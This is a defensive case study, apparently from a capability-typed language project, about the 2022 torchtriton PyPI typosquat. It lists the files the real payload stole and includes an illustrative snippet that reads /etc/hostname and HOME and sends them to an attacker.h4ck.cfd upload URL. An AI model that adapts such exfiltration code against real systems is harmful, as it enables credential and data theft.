# Capa would have caught: the torchtriton PyPI typosquat

A concrete walkthrough of how Capa's capability discipline
structurally prevents the class of supply-chain attack that hit
PyTorch's nightly builds in late December 2022 through a
typosquat on the public PyPI index.

> The full runnable Capa side of this writeup is in
> [`examples/cve_torchtriton.capa`](../examples/cve_torchtriton.capa).

---

## What happened

Between 25 and 30 December 2022, anyone installing the PyTorch
nightly build pulled in a malicious package named
`torchtriton` from the public PyPI index. The legitimate
`torchtriton` is a PyTorch-internal dependency that ships from
PyTorch's own wheel index; an attacker had registered a
typosquat on public PyPI with the same name, and the default
`pip` resolution order preferred PyPI over PyTorch's private
index. Anyone who ran `pip install` against the nightly wheels
without a custom `--extra-index-url` pinning got the malicious
version.

The payload, in the package's `triton/runtime/__init__.py`,
ran on import. It:

1. Read `/etc/hostname`, `/etc/passwd`, `$HOME`, the network
   interface IPs, and the nameservers from `/etc/resolv.conf`.
2. Walked the user's `$HOME` recursively for files matching
   a list of high-value suffixes (`.ssh/*`, `.gitconfig`,
   `.docker/config.json`, `.env`, and similar), capturing up
   to 1000 of them.
3. POSTed the captured data to `*.h4ck.cfd`, a wildcard domain
   the attacker controlled.

The PyTorch team [disclosed the incident on 30 December
2022][pytorch] and removed the package; PyPI revoked the
namespace. Exposure window: about five days. Bytes of data
that left affected workstations: unknown but plausibly large.

Primary sources:

- [PyTorch's incident write-up][pytorch]
- [GitGuardian's reverse-engineering analysis][gitguardian]
- [PyPI advisory PYSEC-2022-43059][pypi]

[pytorch]: https://pytorch.org/blog/compromised-nightly-dependency/
[gitguardian]: https://blog.gitguardian.com/pypi-malicious-package-stole-aws-keys-via-typosquat-of-pytorch-dependency/
[pypi]: https://github.com/pypa/advisory-database/blob/main/vulns/torchtriton/PYSEC-2022-43059.yaml

---

## The anatomy of the attack

torchtriton's legitimate role is to provide a runtime for
just-in-time compilation of GPU kernels for the
[Triton](https://github.com/openai/triton) language. Its
function surface is purely computational: compile a kernel,
choose a launch configuration, dispatch the kernel. Bytes-in,
bytes-out, with tensors flowing through.

The malicious version did none of that for some payload paths.
It opened the filesystem, opened the network, queried the
environment. In a typed capability system, those operations
have *names*: `Fs`, `Net`, `Env`. In Python they have no names;
the language puts them all behind the implicit `os`, `socket`,
and `requests` modules.

What enabled the attack was, again, **ambient authority**.
There was no syntactic difference between a function that
plans a kernel launch and a function that reads `~/.ssh/id_rsa`.
The auditor reading torchtriton's documentation saw "JIT
compiler for tensor kernels". The auditor reading the source
saw a Python module's `__init__.py` with a function that ran
at import time. Two different mental models, one runtime
behaviour.

---

## The Capa version

Here is a miniature kernel-runtime API in Capa
([cve_torchtriton.capa](../examples/cve_torchtriton.capa)):

```capa
type Kernel {
    kind: KernelKind,
    arg_count: Int
}

type LaunchPlan {
    grid_size: Int,
    block_size: Int,
    arg_count: Int
}

fun plan_launch(k: Kernel, work_items: Int) -> LaunchPlan
    ...
```

Run it:

```bash
$ capa --run examples/cve_torchtriton.capa
launch plan: grid=4 block=256 args=3
launch plan: grid=8 block=128 args=4
launch plan: grid=16 block=64 args=2
```

The relevant fact, as in
[event-stream](demo-event-stream.md) and
[eslint-scope](cve_eslint_scope.md), is the **signature**.
`plan_launch` takes a `Kernel` and an `Int` and returns a
`LaunchPlan`. No `Fs`, no `Net`, no `Env`, no `Unsafe`. None
of those names is in scope inside the function body. The
compiler rejects any attempt to use them.

## What an attacker would try

The malicious torchtriton's payload, transliterated into Capa,
would look like:

```capa
fun plan_launch(k: Kernel, work_items: Int) -> LaunchPlan
    // === Attack attempt: walk $HOME, exfiltrate. ===
    let hostname = fs.read("/etc/hostname")
    let user_home = env.get("HOME")
    let _ = net.get("https://attacker.h4ck.cfd/upload?h=${hostname}")
    // === Continue with the legitimate plan. ===
    ...
```

And here is what the analyzer says when you try to compile it:

```
error: undefined name 'fs'
   3 |     let hostname = fs.read("/etc/hostname")
                          ^

error: undefined name 'env'
   4 |     let user_home = env.get("HOME")
                          ^

error: undefined name 'net'
   5 |     let _ = net.get("https://attacker.h4ck.cfd/upload?h=${hostname}")
                  ^
```

Three independent errors. The function has none of `fs`,
`env`, or `net` because its signature did not request any of
them. To make the attack compile, the attacker has to widen
the signature:

```capa
fun plan_launch(fs: Fs, env: Env, net: Net, k: Kernel, work_items: Int) -> LaunchPlan
    // now compiles, but...
```

And **every caller of `plan_launch`** would now have to thread
three capabilities into a function that previously needed none.
PyTorch's wrapper, every layer above it, every CI script, every
notebook that imports it. The change is visible in pull
requests, in code review, in the SBOM diff between releases,
and in any audit reading the SBOM
([`examples/sbom_capability_audit.capa`](../examples/sbom_capability_audit.capa)).

That is, again, the entire point: the attack is not invisible;
it is made expensive to hide.

---

## Why typosquats stay loud in Capa

Typosquatting (a malicious package registered under a name
similar to a legitimate one) is a *registration-level* attack,
orthogonal to the language. Capa cannot prevent a registry
from accepting a similarly-named upload. What Capa *can* do:

- Make the malicious version's *behaviour* loud in its
  signatures. The legitimate `torchtriton.runtime` has zero
  capabilities; the malicious version would need `Fs + Env +
  Net`. The signature delta alone, derived from the SBOM, is
  the alarm bell.

- Combine with attenuation
  ([`fs_env_attenuation.capa`](../examples/fs_env_attenuation.capa)):
  even a project that legitimately needs some filesystem
  access for the legitimate kernel cache should pass
  `fs.restrict_to("/var/cache/torch-kernels/")`, not the full
  `Fs`. A malicious typosquat handed that attenuated `Fs`
  cannot read `~/.ssh/id_rsa` regardless of what the
  signature says.

- Plug into pip's index-priority machinery via the SBOM-based
  audit. If a project's policy lists
  `pkg:pypi/torchtriton@2.0.0` with declared capabilities
  `{}`, and the resolved version's CycloneDX entry lists
  `{Fs, Env, Net}`, the audit fires immediately. The widening
  *cannot* hide.

---

## Why this matters, beyond one incident

torchtriton was one of a string of supply-chain attacks on
ML / Python ecosystems in 2022-2024:

- **PyPI / pip preference shenanigans** (multiple in 2022-2023):
  similar "register a public-PyPI package with the name of a
  private internal dependency" pattern, with `pip` happily
  installing the typosquat.

- **`colors` and `faker` npm sabotage (2022)**: legitimate
  maintainer, not a typosquat; a different shape of the same
  underlying problem (ambient authority + trust placed in the
  registry).

- **`xz-utils` 2024**: not a typosquat, but the same
  observation, the language gave the maintainer's malicious
  code authority it had not declared a need for.

Capa addresses the *signature visibility* dimension of these
attacks. It does not address registry-level controls,
maintainer-takeover trust, or build-system tampering. The
[positioning document](positioning.md) is explicit about that
boundary.

---

## What Capa does *not* solve

The same honest limits as the other case studies in this
repo. Listing them once more here so this writeup is
self-contained:

- A capability holder with bad intent is still dangerous.
  Attenuation reduces the blast radius; it does not eliminate
  trust.
- The `Unsafe` boundary (`py_import` / `py_invoke`) is a real
  hole. Anything that crosses into Python loses Capa's
  guarantees. Visible in the SBOM via the `capa:has_unsafe`
  property; trust budget for those functions has to be
  higher.
- Capa is not a sandbox. Process-level compromise is
  orthogonal. Capa makes source-level guarantees, not
  containment ones.

---

## The five-case-study summary

This is the fifth CVE walkthrough in the repo and brings the
balance to **three clean wins** (event-stream, eslint-scope,
torchtriton) and **two partial losses**
([node-ipc](cve_node_ipc.md) for legitimate-authority-abuse,
[xz-utils](cve_xz_utils.md) for below-the-language attacks).
The breakdown by attack shape:

| Case study   | Shape                          | Capa verdict   |
|--------------|--------------------------------|----------------|
| event-stream | malicious dependency injection | win            |
| eslint-scope | credential theft via Fs+Net    | win            |
| torchtriton  | typosquat with the same shape  | win            |
| node-ipc     | legitimate-authority abuse     | partial (attenuation) |
| xz-utils     | below-language build attack    | partial (orthogonal defences) |

A balanced experimental section needs both kinds. The wins
establish that Capa addresses real attacks; the partial losses
establish that the claim is calibrated.

---

## Run it yourself

```bash
# The safe version (compiles and runs):
capa --run examples/cve_torchtriton.capa

# The attack version: copy the malicious plan_launch from
# above into a file, run --check, observe the three
# "undefined name" errors.
```
